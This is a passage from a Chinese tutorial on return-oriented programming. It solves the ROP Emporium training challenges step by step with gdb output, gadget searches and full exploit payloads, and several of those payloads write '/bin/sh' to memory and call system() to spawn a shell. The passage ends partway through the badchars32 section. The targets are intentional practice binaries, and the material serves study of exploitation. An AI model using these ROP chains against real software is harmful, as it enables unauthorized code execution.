# 3.1.4 返回导向编程（ROP）

- [ROP 简介](#rop-简介)
  - [寻找 gadgets](#寻找-gadgets)
  - [常用的 gadgets](#常用的-gadgets)
- [ROP Emporium](#rop-emporium)
  - [ret2win32](#ret2win32)
  - [ret2win](#ret2win)
  - [split32](#split32)
  - [split](#split)
  - [callme32](#callme32)
  - [callme](#callme)
  - [write432](#write432)
  - [write4](#write4)
  - [badchars32](#badchars32)
  - [badchars](#badchars)
  - [fluff32](#fluff32)
  - [fluff](#fluff)
  - [pivot32](#pivot32)
  - [pivot](#pivot)
- [更多资料](#更多资料)

## ROP 简介

返回导向编程（Return-Oriented Programming，缩写：ROP）是一种高级的内存攻击技术，该技术允许攻击者在现代操作系统的各种通用防御下执行代码，如内存不可执行和代码签名等。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（gadgets），每一段 gadget 通常以 return 指令（`ret`，机器码为`c3`）结束，并位于共享库代码中的子程序中。通过执行这些指令序列，也就控制了程序的执行。

`ret` 指令相当于 `pop eip`。即，首先将 `esp` 指向的 4 字节内容读取并赋值给 `eip`，然后 `esp` 加上 4 字节指向栈的下一个位置。如果当前执行的指令序列仍然以 `ret` 指令结束，则这个过程将重复， `esp` 再次增加并且执行下一个指令序列。

### 寻找 gadgets

1. 在程序中寻找所有的 c3（ret） 字节
2. 向前搜索，看前面的字节是否包含一个有效指令，这里可以指定最大搜索字节数，以获得不同长度的 gadgets
3. 记录下我们找到的所有有效指令序列

理论上我们是可以这样寻找 gadgets 的，但实际上有很多工具可以完成这个工作，如 ROPgadget，Ropper 等。更完整的搜索可以使用 <http://ropshell.com/>。

### 常用的 gadgets

对于 gadgets 能做的事情，基本上只要你敢想，它就敢执行。下面简单介绍几种用法：

- 保存栈数据到寄存器
  - 将栈顶的数据抛出并保存到寄存器中，然后跳转到新的栈顶地址。所以当返回地址被一个 gadgets 的地址覆盖，程序将在返回后执行该指令序列。
  - 如：`pop eax; ret`
- 保存内存数据到寄存器
  - 将内存地址处的数据加载到内存器中。
  - 如：`mov ecx,[eax]; ret`
- 保存寄存器数据到内存
  - 将寄存器的值保存到内存地址处。
  - 如：`mov [eax],ecx; ret`
- 算数和逻辑运算
  - add, sub, mul, xor 等。
  - 如：`add eax,ebx; ret`, `xor edx,edx; ret`
- 系统调用
  - 执行内核中断
  - 如：`int 0x80; ret`, `call gs:[0x10]; ret`
- 会影响栈帧的 gadgets
  - 这些 gadgets 会改变 ebp 的值，从而影响栈帧，在一些操作如 stack pivot 时我们需要这样的指令来转移栈帧。
  - 如：`leave; ret`, `pop ebp; ret`

## ROP Emporium

[ROP Emporium](https://ropemporium.com) 提供了一系列用于学习 ROP 的挑战，每一个挑战都介绍了一个知识，难度也逐渐增加，是循序渐进学习 ROP 的好资料。ROP Emporium 还有个特点是它专注于 ROP，所有挑战都有相同的漏洞点，不同的只是 ROP 链构造的不同，所以不涉及其他的漏洞利用和逆向的内容。每个挑战都包含了 32 位和 64 位的程序，通过对比能帮助我们理解 ROP 链在不同体系结构下的差异，例如参数的传递等。这篇文章我们就从这些挑战中来学习吧。

这些挑战都包含一个 `flag.txt` 的文件，我们的目标就是通过控制程序执行，来打印出文件中的内容。当然你也可以尝试获得 shell。

[下载文件](../src/others/3.1.4_rop/rop_emporium.bin)

### ret2win32

通常情况下，对于一个有缓冲区溢出的程序，我们通常先输入一定数量的字符填满缓冲区，然后是精心构造的 ROP 链，通过覆盖堆栈上保存的返回地址来实现函数跳转（关于缓冲区溢出请查看上一章 3.1.3栈溢出）。

第一个挑战我会尽量详细一点，因为所有挑战程序都有相似的结构，缓冲区大小都一样，我们看一下漏洞函数：

```text
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x080485f6 <+0>:     push   ebp
   0x080485f7 <+1>:     mov    ebp,esp
   0x080485f9 <+3>:     sub    esp,0x28
   0x080485fc <+6>:     sub    esp,0x4
   0x080485ff <+9>:     push   0x20
   0x08048601 <+11>:    push   0x0
   0x08048603 <+13>:    lea    eax,[ebp-0x28]
   0x08048606 <+16>:    push   eax
   0x08048607 <+17>:    call   0x8048460 <memset@plt>
   0x0804860c <+22>:    add    esp,0x10
   0x0804860f <+25>:    sub    esp,0xc
   0x08048612 <+28>:    push   0x804873c
   0x08048617 <+33>:    call   0x8048420 <puts@plt>
   0x0804861c <+38>:    add    esp,0x10
   0x0804861f <+41>:    sub    esp,0xc
   0x08048622 <+44>:    push   0x80487bc
   0x08048627 <+49>:    call   0x8048420 <puts@plt>
   0x0804862c <+54>:    add    esp,0x10
   0x0804862f <+57>:    sub    esp,0xc
   0x08048632 <+60>:    push   0x8048821
   0x08048637 <+65>:    call   0x8048400 <printf@plt>
   0x0804863c <+70>:    add    esp,0x10
   0x0804863f <+73>:    mov    eax,ds:0x804a060
   0x08048644 <+78>:    sub    esp,0x4
   0x08048647 <+81>:    push   eax
   0x08048648 <+82>:    push   0x32
   0x0804864a <+84>:    lea    eax,[ebp-0x28]
   0x0804864d <+87>:    push   eax
   0x0804864e <+88>:    call   0x8048410 <fgets@plt>
   0x08048653 <+93>:    add    esp,0x10
   0x08048656 <+96>:    nop
   0x08048657 <+97>:    leave  
   0x08048658 <+98>:    ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
   0x08048659 <+0>:     push   ebp
   0x0804865a <+1>:     mov    ebp,esp
   0x0804865c <+3>:     sub    esp,0x8
   0x0804865f <+6>:     sub    esp,0xc
   0x08048662 <+9>:     push   0x8048824
   0x08048667 <+14>:    call   0x8048400 <printf@plt>
   0x0804866c <+19>:    add    esp,0x10
   0x0804866f <+22>:    sub    esp,0xc
   0x08048672 <+25>:    push   0x8048841
   0x08048677 <+30>:    call   0x8048430 <system@plt>
   0x0804867c <+35>:    add    esp,0x10
   0x0804867f <+38>:    nop
   0x08048680 <+39>:    leave  
   0x08048681 <+40>:    ret
End of assembler dump.
```

函数 `pwnme()` 是存在缓冲区溢出的函数，它调用 `fgets()` 读取任意数据，但缓冲区的大小只有 40 字节（`0x0804864a <+84>:    lea    eax,[ebp-0x28]`，0x28=40），当输入大于 40 字节的数据时，就可以覆盖掉调用函数的 ebp 和返回地址：

```text
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EBX: 0x0
ECX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EDX: 0xf7f90860 --> 0x0
ESI: 0xf7f8ee28 --> 0x1d1d30
EDI: 0x0
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
0004| 0xffffd5f4 --> 0xffffd610 --> 0x1
0008| 0xffffd5f8 --> 0x0
0012| 0xffffd5fc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
0016| 0xffffd600 --> 0xf7f8ee28 --> 0x1d1d30
0020| 0xffffd604 --> 0xf7f8ee28 --> 0x1d1d30
0024| 0xffffd608 --> 0x0
0028| 0xffffd60c --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern_offset $ebp
1093681473 found at offset: 40
gdb-peda$ pattern_offset $eip
1094796865 found at offset: 44
```

缓冲区距离 ebp 和 eip 的偏移分别为 40 和 44，这就验证了我们的假设。

通过查看程序的逻辑，虽然我们知道 .text 段中存在函数 `ret2win()`，但在程序执行中并没有调用到它，我们要做的就是用该函数的地址覆盖返回地址，使程序跳转到该函数中，从而打印出 flag，我们称这一类型的 ROP 为 ret2text。

还有一件重要的事情是 checksec：

```text
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

这里开启了关闭了 PIE，所以 .text 的加载地址是不变的，可以直接使用 `ret2win()` 的地址 `0x08048659`。

payload 如下（注这篇文章中的paylaod我会使用多种方法来写，以展示各种工具的使用）：

```text
$ python2 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

### ret2win

现在是 64 位程序：

```text
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>:     push   rbp
   0x00000000004007b6 <+1>:     mov    rbp,rsp
   0x00000000004007b9 <+4>:     sub    rsp,0x20
   0x00000000004007bd <+8>:     lea    rax,[rbp-0x20]
   0x00000000004007c1 <+12>:    mov    edx,0x20
   0x00000000004007c6 <+17>:    mov    esi,0x0
   0x00000000004007cb <+22>:    mov    rdi,rax
   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
   0x00000000004007d3 <+30>:    mov    edi,0x4008f8
   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
   0x00000000004007dd <+40>:    mov    edi,0x400978
   0x00000000004007e2 <+45>:    call   0x4005d0 <puts@plt>
   0x00000000004007e7 <+50>:    mov    edi,0x4009dd
   0x00000000004007ec <+55>:    mov    eax,0x0
   0x00000000004007f1 <+60>:    call   0x4005f0 <printf@plt>
   0x00000000004007f6 <+65>:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007fd <+72>:    lea    rax,[rbp-0x20]
   0x0000000000400801 <+76>:    mov    esi,0x32
   0x0000000000400806 <+81>:    mov    rdi,rax
   0x0000000000400809 <+84>:    call   0x400620 <fgets@plt>
   0x000000000040080e <+89>:    nop
   0x000000000040080f <+90>:    leave  
   0x0000000000400810 <+91>:    ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400811 <+0>:     push   rbp
   0x0000000000400812 <+1>:     mov    rbp,rsp
   0x0000000000400815 <+4>:     mov    edi,0x4009e0
   0x000000000040081a <+9>:     mov    eax,0x0
   0x000000000040081f <+14>:    call   0x4005f0 <printf@plt>
   0x0000000000400824 <+19>:    mov    edi,0x4009fd
   0x0000000000400829 <+24>:    call   0x4005e0 <system@plt>
   0x000000000040082e <+29>:    nop
   0x000000000040082f <+30>:    pop    rbp
   0x0000000000400830 <+31>:    ret
End of assembler dump.
```

首先与 32 位不同的是参数传递，64 位程序的前六个参数通过 RDI、RSI、RDX、RCX、R8 和 R9 传递。所以缓冲区大小参数通过 rdi 传递给 `fgets()`，大小为 32 字节。

而且由于 ret 的地址不存在，程序停在了 `=> 0x400810 <pwnme+91>: ret` 这一步，这是因为 64 位可以使用的内存地址不能大于 `0x00007fffffffffff`，否则就会抛出异常。

```text
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0
RCX: 0x1f
RDX: 0x7ffff7dd4710 --> 0x0
RSI: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RDI: 0x7fffffffe401 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe428 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:      ret)
R8 : 0x0
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n")
R11: 0x246
R12: 0x400650 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe510 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>: call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>: nop
   0x40080f <pwnme+90>: leave  
=> 0x400810 <pwnme+91>: ret
   0x400811 <ret2win>:  push   rbp
   0x400812 <ret2win+1>:        mov    rbp,rsp
   0x400815 <ret2win+4>:        mov    edi,0x4009e0
   0x40081a <ret2win+9>:        mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe428 ("AA0AAFAAb")
0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000
0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (<__libc_start_main+234>:       mov    edi,eax)
0024| 0x7fffffffe440 --> 0x0
0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 ("/home/firmy/Desktop/rop_emporium/ret2win/ret2win")
0040| 0x7fffffffe450 --> 0x100000000
0048| 0x7fffffffe458 --> 0x400746 (<main>:      push   rbp)
0056| 0x7fffffffe460 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_offset $rbp
7007954260868540737 found at offset: 32
gdb-peda$ pattern_offset AA0AAFAAb
AA0AAFAAb found at offset: 40
```

`re2win()` 的地址为 `0x0000000000400811`，payload 如下：

```python
from zio import *

payload = "A"*40 + l64(0x0000000000400811)

io = zio('./ret2win')
io.writeline(payload)
io.read()
```

### split32

这一题也是 ret2text，但这一次，我们有的是一个 `usefulFunction()` 函数：

```text
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:     push   ebp
   0x0804864a <+1>:     mov    ebp,esp
   0x0804864c <+3>:     sub    esp,0x8
   0x0804864f <+6>:     sub    esp,0xc
   0x08048652 <+9>:     push   0x8048747
   0x08048657 <+14>:    call   0x8048430 <system@plt>
   0x0804865c <+19>:    add    esp,0x10
   0x0804865f <+22>:    nop
   0x08048660 <+23>:    leave  
   0x08048661 <+24>:    ret
End of assembler dump.
```

它调用 `system()` 函数，而我们要做的是给它传递一个参数，执行该参数后可以打印出 flag。

使用 radare2 中的工具 rabin2 在 `.data` 段中搜索字符串：

```text
$ rabin2 -z split32
...
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
```

我们发现存在字符串 `/bin/cat flag.txt`，这正是我们需要的，地址为 `0x0804a030`。

下面构造 payload，这里就有两种方法，一种是直接使用调用 `system()` 函数的地址 `0x08048657`，另一种是使用 `system()` 的 plt 地址 `0x8048430`，在前面的章节中我们已经知道了 plt 的延迟绑定机制（1.5.6动态链接），这里我们再回顾一下：

绑定前：

```text
gdb-peda$ disassemble system
Dump of assembler code for function system@plt:
   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a018
   0x08048436 <+6>:     push   0x18
   0x0804843b <+11>:    jmp    0x80483f0
gdb-peda$ x/5x 0x804a018  
0x804a018:      0x08048436      0x08048446      0x08048456      0x08048466
0x804a028:      0x00000000
```

绑定后：

```text
gdb-peda$ disassemble system
Dump of assembler code for function system:
   0xf7df9c50 <+0>:     sub    esp,0xc
   0xf7df9c53 <+3>:     mov    eax,DWORD PTR [esp+0x10]
   0xf7df9c57 <+7>:     call   0xf7ef32cd <__x86.get_pc_thunk.dx>
   0xf7df9c5c <+12>:    add    edx,0x1951cc
   0xf7df9c62 <+18>:    test   eax,eax
   0xf7df9c64 <+20>:    je     0xf7df9c70 <system+32>
   0xf7df9c66 <+22>:    add    esp,0xc
   0xf7df9c69 <+25>:    jmp    0xf7df9700 <do_system>
   0xf7df9c6e <+30>:    xchg   ax,ax
   0xf7df9c70 <+32>:    lea    eax,[edx-0x57616]
   0xf7df9c76 <+38>:    call   0xf7df9700 <do_system>
   0xf7df9c7b <+43>:    test   eax,eax
   0xf7df9c7d <+45>:    sete   al
   0xf7df9c80 <+48>:    add    esp,0xc
   0xf7df9c83 <+51>:    movzx  eax,al
   0xf7df9c86 <+54>:    ret
End of assembler dump.
gdb-peda$ x/5x 0x08048430
0x8048430 <system@plt>: 0xa01825ff      0x18680804      0xe9000000      0xffffffb0
0x8048440 <__libc_start_main@plt>:      0xa01c25ff
```

其实这里讲 plt 不是很确切，因为 system 使用太频繁，在我们使用它之前，它就已经绑定了，在后面的挑战中我们会遇到没有绑定的情况。

两种 payload 如下：

```text
$ python2 -c "print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\x08'" | ./split32
...
> ROPE{a_placeholder_32byte_flag!}
```

```python
from zio import *

payload  = "A"*44
payload += l32(0x08048430)
payload += "BBBB"
payload += l32(0x0804a030)

io = zio('./split32')
io.writeline(payload)
io.read()
```

注意 "BBBB" 是新的返回地址，如果函数 ret，就会执行 "BBBB" 处的指令，通常这里会放置一些 `pop;pop;ret` 之类的指令地址，以平衡堆栈。从 system() 函数中也能看出来，它现将 esp 减去 0xc，再取地址 esp+0x10 处的指令，也就是 "BBBB" 的后一个，即字符串的地址。因为 `system()` 是 libc 中的函数，所以这种方法称作 ret2libc。

### split

```text
$ rabin2 -z split
...
vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
```

字符串地址在 `0x00601060`。

```text
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>:     push   rbp
   0x0000000000400808 <+1>:     mov    rbp,rsp
   0x000000000040080b <+4>:     mov    edi,0x4008ff
   0x0000000000400810 <+9>:     call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:    nop
   0x0000000000400816 <+15>:    pop    rbp
   0x0000000000400817 <+16>:    ret
End of assembler dump.
```

64 位程序的第一个参数通过 edi 传递，所以我们需要再调用一个 gadgets 来将字符串的地址存进 edi。

我们先找到需要的 gadgets：

```text
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400883 : (b'5fc3')  pop rdi; ret
```

下面是 payload：

```text
$ python2 -c "print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00\x00\x00'" | ./split
...
> ROPE{a_placeholder_32byte_flag!}
```

那我们是否还可以用前面那种方法调用 `system()` 的 plt 地址 `0x4005e0` 呢：

```text
gdb-peda$ disassemble system
Dump of assembler code for function system:
   0x00007ffff7a63010 <+0>:     test   rdi,rdi
   0x00007ffff7a63013 <+3>:     je     0x7ffff7a63020 <system+16>
   0x00007ffff7a63015 <+5>:     jmp    0x7ffff7a62a70 <do_system>
   0x00007ffff7a6301a <+10>:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7a63020 <+16>:    lea    rdi,[rip+0x138fd6]        # 0x7ffff7b9bffd
   0x00007ffff7a63027 <+23>:    sub    rsp,0x8
   0x00007ffff7a6302b <+27>:    call   0x7ffff7a62a70 <do_system>
   0x00007ffff7a63030 <+32>:    test   eax,eax
   0x00007ffff7a63032 <+34>:    sete   al
   0x00007ffff7a63035 <+37>:    add    rsp,0x8
   0x00007ffff7a63039 <+41>:    movzx  eax,al
   0x00007ffff7a6303c <+44>:    ret
End of assembler dump.
```

依然可以，因为参数的传递没有用到栈，我们只需把地址直接更改就可以了：

```python
from zio import *

payload  = "A"*40
payload += l64(0x00400883)
payload += l64(0x00601060)
payload += l64(0x4005e0)

io = zio('./split')
io.writeline(payload)
io.read()
```

### callme32

这里我们要接触真正的 plt 了，根据题目提示，callme32 从共享库 libcallme32.so 中导入三个特殊的函数：

```text
$ rabin2 -i callme32 | grep callme
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
```

我们要做的是依次调用 `callme_one()`、`callme_two()` 和 `callme_three()`，并且每个函数都要传入参数 `1`、`2`、`3`。通过调试我们能够知道函数逻辑，`callme_one` 用于读入加密后的 flag，然后依次调用 `callme_two` 和 `callme_three` 进行解密。

由于函数参数是放在栈上的，为了平衡堆栈，我们需要一个 `pop;pop;pop;ret` 的 gadgets：

```text
$ objdump -d callme32 | grep -A 3 pop
...
 80488a8:       5b                      pop    %ebx
 80488a9:       5e                      pop    %esi
 80488aa:       5f                      pop    %edi
 80488ab:       5d                      pop    %ebp
 80488ac:       c3                      ret
 80488ad:       8d 76 00                lea    0x0(%esi),%esi
...
```

或者是 `add esp, 8; pop; ret`，反正只要能平衡，都可以：

```text
gdb-peda$ ropsearch "add esp, 8"
Searching for ROP gadget: 'add esp, 8' in: binary ranges
0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
```

构造 payload 如下：

```python
from zio import *

payload  = "A"*44

payload += l32(0x080485c0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

payload += l32(0x08048620)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

payload += l32(0x080485b0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)

io = zio('./callme32')
io.writeline(payload)
io.read()
```

### callme

64 位程序不需要平衡堆栈了，只要将参数按顺序依次放进寄存器中就可以了。

```text
$ rabin2 -i callme | grep callme
ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three
ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one
ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two
```

```text
gdb-peda$ ropsearch "pop rdi; pop rsi"
Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
```

payload 如下：

```python
from zio import *

payload  = "A"*40

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401850)

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401870)

payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401810)

io = zio('./callme')
io.writeline(payload)
io.read()
```

### write432

这一次，我们已经不能在程序中找到可以执行的语句了，但我们可以利用 gadgets 将 `/bin/sh` 写入到目标进程的虚拟内存空间中，如 `.data` 段中，再调用 system() 执行它，从而拿到 shell。要认识到一个重要的点是，ROP 只是一种任意代码执行的形式，只要我们有创意，就可以利用它来执行诸如内存读写等操作。

这种方法虽然好用，但还是要考虑我们写入地址的读写和执行权限，以及它能提供的空间是多少，我们写入的内容是否会影响到程序执行等问题。如我们接下来想把字符串写入 `.data` 段，我们看一下它的权限和大小等信息：

```text
$ readelf -S write432
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
```

可以看到 `.data` 具有 `WA`，即写入（write）和分配（alloc）的权利，而 `.rodata` 就不能写入。

使用工具 ropgadget 可以很方便地找到我们需要的 gadgets：

```text
$ ropgadget --binary write432 --only "mov|pop|ret"
...
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080486da : pop edi ; pop ebp ; ret
```

另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成两次写入，还得注意字符对齐，有没有截断字符（`\x00`,`\x0a`等）之类的问题，比如这里 `/bin/sh` 只有七个字节，我们可以使用 `/bin/sh\00` 或者 `/bin//sh`，构造 payload 如下：

```python
from zio import *

pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670

data_addr   = 0x804a028
system_plt  = 0x8048430

payload  = ""
payload += "A"*44
payload += l32(pop_edi_ebp)
payload += l32(data_addr)
payload += "/bin"
payload += l32(mov_edi_ebp)
payload += l32(pop_edi_ebp)
payload += l32(data_addr+4)
payload += "/sh\x00"
payload += l32(mov_edi_ebp)
payload += l32(system_plt)
payload += "BBBB"
payload += l32(data_addr)

io = zio('./write432')
io.writeline(payload)
io.interact()
```

```text
$ python2 run.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB(�
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

### write4

64 位程序就可以一次性写入了。

```text
$ ropgadget --binary write4 --only "mov|pop|ret"
...
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400893 : pop rdi ; ret
```

```python
from pwn import *

pop_r14_r15 = 0x0000000000400890
mov_r14_r15 = 0x0000000000400820
pop_rdi = 0x0000000000400893
data_addr = 0x0000000000601050
system_plt = 0x004005e0

payload  = "A"*40
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += "/bin/sh\x00"
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./write4')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

### badchars32

在这个挑战中，我们依然要将 `/bin/sh` 写入到进程内存中，但这一次程序在读取输入时会对敏感字符进行检查，查看函数 `checkBadchars()`：

```text
gdb-peda$ disassemble checkBadchars
Dump of assembler code for function checkBadchars:
   0x08048801 <+0>:     push   ebp
   0x08048802 <+1>:     mov    ebp,esp
   0x08048804 <+3>:     sub    esp,0x10
   0x08048807 <+6>:     mov    BYTE PTR [ebp-0x10],0x62
   0x0804880b <+10>:    mov    BYTE PTR [ebp-0xf],0x69
   0x0804880f <+14>:    mov    BYTE PTR [ebp-0xe],0x63
   0x08048813 <+18>:    mov    BYTE PTR [ebp-0xd],0x2f
   0x08048817 <+22>:    mov    BYTE PTR [ebp-0xc],0x20
   0x0804881b <+26>:    mov    BYTE PTR [ebp-0xb],0x66
   0x0804881f <+30>:    mov    BYTE PTR [ebp-0xa],0x6e
   0x08048823 <+34>:    mov    BYTE PTR [ebp-0x9],0x73
   0x08048827 <+38>:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804882e <+45>:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048835 <+52>:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804883c <+59>:    jmp    0x804887c <checkBadchars+123>
   0x0804883e <+61>:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048845 <+68>:    jmp    0x8048872 <checkBadchars+113>
   0x08048847 <+70>:    mov    edx,DWORD PTR [ebp+0x8]
   0x0804884a <+73>:    mov    eax,DWORD PTR [ebp-0x4]
   0x0804884d <+76>:    add    eax,edx
   0x0804884f <+78>:    movzx  edx,BYTE PTR [eax]
   0x08048852 <+81>:    lea    ecx,[ebp-0x10]
   0x08048855 <+84>:    mov    eax,DWORD PTR [ebp-0x8]
   0x08048858 <+87>:    add    eax,ecx
   0x0804885a <+89>:    movzx  eax,BYTE PTR [eax]
   0x0804885d <+92>:    cmp    dl,al
   0x0804885f <+94>:    jne    0x804886e <checkBadchars+109>
   0x08048861 <+96>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048864 <+99>:    mov    eax,DWORD PTR [ebp-0x4]
   0x08048867 <+102>:   add    eax,edx
   0x08048869 <+104>:   mov    BYTE PTR [eax],0xeb
   0x0804886c <+107>:   jmp    0x8048878 <checkBadchars+119>
   0x0804886e <+109>:   add    DWORD PTR [ebp-0x8],0x1
   0x08048872 <+113>:   cmp    DWORD PTR [ebp-0x8],0x7
   0x08048876 <+117>:   jbe    0x8048847 <checkBadchars+70>
   0x08048878 <+119>:   add    DWORD PTR [ebp-0x4],0x1
   0x0804887c <+123>:   mov    eax,DWORD PTR [ebp-0x4]
   0x0804887f <+126>:   cmp    eax,DWORD PTR [ebp+0xc]
   0x08048882 <+129>:   jb     0x804883e <checkBadchars+61>
   0x08048884 <+131>:   nop
   0x08048885 <+132>:   leave  
   0x08048886 <+133>:   ret
End of assembler dump.
```

很明显，地址 `0x08048807` 到 `0x08048823` 的字符就是所谓的敏感字符。处理敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。

找到 gadgets：

```text
$ ropgadget --binary badchars32 --only "mov|pop|ret|xor"
...
0x08048893 : mov dword ptr [edi], esi ; ret
0x08048896 : pop ebx ; pop ecx ; ret
